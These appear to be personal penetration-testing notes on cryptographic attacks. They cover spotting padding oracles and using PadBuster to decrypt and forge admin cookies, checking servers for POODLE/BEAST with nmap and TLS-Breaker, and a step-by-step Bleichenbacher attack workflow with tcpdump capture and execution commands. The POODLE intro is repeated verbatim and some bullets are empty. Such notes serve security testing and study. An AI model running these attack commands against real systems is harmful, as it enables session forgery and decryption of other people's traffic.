
padding oracles 

### **1. Identifying the Entry Point**

- **Target Encoded Strings:** Look for Base64 or Hex encoded strings in **Cookies**, **Hidden Form Fields**, or **URL Parameters** (e.g., `user=QUJDREVGR0hJSktMTU5PUA==`).
    
- **Analyze the Content:** Decode the string; if it results in unreadable "garbage" binary data, it is likely encrypted and worth testing.
    

### **2. Testing for the "Oracle"**

- **Trigger an Error By modifying last bytes**
    
- **Compare Responses** 
    

### **3. What to Look For (The Indicators)**

- **Verbose Error Messages:** Explicit responses like "Invalid Padding," "PKCS#7 error," or "Decryption failed."
    
- **HTTP Status Codes:** A `500 Internal Server Error` for bad padding versus a `200 OK` or `401 Unauthorized` for valid padding.
    
- **Different Response Length:**
    
- **Timing Differences:** 
    

### **4. Practical Exploitation**

- **Determine Block Size:** Test with common sizes like **16 bytes** (AES) or **8 bytes** (DES/3DES).
    
- **Automate with Tools:** * **PadBuster:** Use for automated decryption of existing strings or for forging new ones (e.g., changing `user=guest` to `user=admin`).
    
    - **Burp Suite:** Use the "Padding Oracle Hunter" extension or the "Intruder" tool to manually compare response differences.

**A. Decrypting Data:** Run this to see what is hidden inside the encrypted string (e.g., `user=guest`):

if it was a post param then it would be -post instead of -cookie flag

```
padbuster [URL] "[EncryptedSample]" [BlockSize] -cookies "user=[EncryptedSample]"
```

B- Forging the data you want 
Bash

```
padbuster [URL] "[Sample]" 16 -cookies "user=[Sample]" -plaintext "user=admin"
```


Poodle&BEAST 

To identify and exploit **POODLE** and **BEAST** vulnerabilities, focus on these practical points:

### **1. How to Find the Vulnerabilities**

- **Check Protocol Support:** Use tools like `nmap` or `sslyze` to see if the server supports **SSL 3.0** (for POODLE) or **TLS 1.0** (for BEAST).
    
    - Example: `nmap --script ssl-enum-ciphers -p 443 <IP>`
        
- **Identify CBC Ciphers:** These attacks only work if the server uses **Cipher Block Chaining (CBC)** mode (e.g., `TLS_RSA_WITH_AES_128_CBC_SHA`).
    
- **Look for Protocol Downgrades:** Test if you can force a modern browser to "fallback" to SSL 3.0 by interfering with the initial handshake.
To identify and exploit **POODLE** and **BEAST** vulnerabilities, focus on these practical points:

### **1. How to Find the Vulnerabilities**

- **Check Protocol Support:** Use tools like `nmap` or `sslyze` to see if the server supports **SSL 3.0** (for POODLE) or **TLS 1.0** (for BEAST).
    
    - Example: `nmap --script ssl-enum-ciphers -p 443 <IP>`
        
- **Identify CBC Ciphers:** These attacks only work if the server uses **Cipher Block Chaining (CBC)** mode (e.g., `TLS_RSA_WITH_AES_128_CBC_SHA`).
    
- **Look for Protocol Downgrades:** Test if you can force a modern browser to "fallback" to SSL 3.0 by interfering with the initial handshake.
    

### **2. Practical Identification Checklist**

|Attack|Primary Target|Key Indicator|
|---|---|---|
|**POODLE**|SSL 3.0|Server accepts connections using SSL 3.0 with CBC ciphers.|
|**BEAST**|TLS 1.0|Server supports TLS 1.0 and uses CBC-based suites.|

---

### **3. Exploitation Steps (Using TLS-Breaker)**

If the server supports the vulnerable protocols, use **TLS-Breaker** to verify.

- **Setup:** Ensure you have Java 11 installed and build the tool using Maven.
    
- **Scanning for POODLE:**
    
    Bash
    
    ```
    java -jar apps/poodle-1.0.1.jar -connect <IP>:<PORT>
    ```
    
- **Interpreting Results:**
    
    - `VULNERABILITY_POSSIBLE`: The server accepted the crafted handshake and didn't throw a MAC error where it should have.
        
    - `NOT_VULNERABLE`: The server rejected the connection or correctly handled the padding/MAC check.

### Bleichenbacher Attack — Full Workflow Summary

#### Prerequisites

- Java 11 specifically (not newer)
- `bleichenbacher-1.0.1.jar`
- `tcpdump`, `openssl`

---

#### Step 1 — Verify the target uses RSA key exchange

bash

```bash
echo | openssl s_client -connect <IP>:<PORT> 2>/dev/null | openssl x509 -noout -text | grep -E "Public Key Algorithm|RSA|EC"
```

You need to see `rsaEncryption`. If you see `id-ecPublicKey` → attack won't work.

---

#### Step 2 — Confirm the oracle exists (vulnerability check)

bash

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
  -jar apps/bleichenbacher-1.0.1.jar \
  -connect <IP>:<PORT>
```

Look for:

```
Found a behavior difference within the responses. The server could be vulnerable.
```

If you see that → oracle confirmed, proceed.

---

#### Step 3 — Find which interface routes to the target

bash

```bash
ip route get <IP>
```

Output tells you the interface (`dev enp8s0`, `dev tun0`, etc.) — use that in tcpdump.

---

#### Step 4 — Capture a real handshake

**Terminal 1 — start capture first, leave running:**

bash

```bash
sudo tcpdump -i <INTERFACE> -w capture.pcap host <IP> and port <PORT>
```

**Terminal 2 — while Terminal 1 is still running:**

bash

```bash
openssl s_client -connect <IP>:<PORT> -tls1_2 -cipher AES128-SHA
```

Wait for full session info to appear, then `Ctrl+C` Terminal 1.

Verify you got packets:

```
~19 packets captured  ← anything >0 is fine
link-type EN10MB      ← Ethernet, pcap4j parses this correctly
```

---

#### Step 5 — Execute the attack

bash

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
  -jar apps/bleichenbacher-1.0.1.jar \
  -connect <IP>:<PORT> \
  -pcap capture.pcap \
  -executeAttack
```

---

#### Variable reference

| Variable             | How to determine it                                                                      |
| -------------------- | ---------------------------------------------------------------------------------------- |
| `<IP>:<PORT>`        | Target address, given by the challenge/scope                                             |
| `<INTERFACE>`        | Run `ip route get <IP>` → look at `dev` field                                            |
| `-cipher AES128-SHA` | Any `TLS_RSA_*` suite works — RSA key exchange is what matters, not the symmetric cipher |
| `capture.pcap`       | Output filename, your choice                                                             |
| Java 11 path         | Run `update-java-alternatives -l` if `/usr/lib/jvm/java-11-openjdk-amd64` doesn't exist  |